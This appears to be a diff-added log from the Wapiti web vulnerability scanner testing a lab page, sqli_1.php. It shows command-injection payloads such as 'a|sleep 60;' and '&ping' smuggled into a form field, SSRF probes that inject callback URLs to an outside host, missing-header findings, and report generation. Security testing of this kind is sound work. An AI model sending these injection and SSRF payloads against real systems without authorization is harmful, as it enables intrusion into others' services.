+2024-03-20 16:41:28.665 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=a%7Csleep%2060%3B
+2024-03-20 16:41:28.672 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 16:41:28.701 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 16:41:28.715 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
+2024-03-20 16:41:28.716 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/sqli_1.php?title=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F1%2F7469746c65%2F&action=search (0)
+2024-03-20 16:41:28.726 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/sqli_1.php?title=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F1%2F616374696f6e%2F (0)
+2024-03-20 16:41:28.743 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
+2024-03-20 16:41:28.743 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/sqli_1.php?title=default&action=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F4%2F616374696f6e%2F (1)
+2024-03-20 16:41:28.764 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php (1)
+2024-03-20 16:41:28.777 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:41:28.777 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F2%2F666f726d5f73656375726974795f6c6576656c%2F&security_level=2
+2024-03-20 16:41:28.789 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F2%2F73656375726974795f6c6576656c%2F
+2024-03-20 16:41:28.807 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13
+2024-03-20 16:41:28.808 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F3%2F666f726d5f627567%2F&bug=13
+2024-03-20 16:41:28.818 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F3%2F627567%2F
+2024-03-20 16:41:28.849 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=gtizmc for results, please wait...
+2024-03-20 16:41:30.989 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 16:41:31.007 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
+2024-03-20 16:41:31.025 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 16:41:31.025 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 16:41:31.100 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 16:41:31.100 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 16:41:31.218 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 16:41:31.230 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
+2024-03-20 16:41:31.263 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
+2024-03-20 16:41:31.297 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php (1)
+2024-03-20 16:41:31.410 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 16:41:31.435 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//sqli_get_search.json/
+2024-03-20 16:41:31.435 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//sqli_get_search.json/web_03202024_1641.html with a browser to see this report.
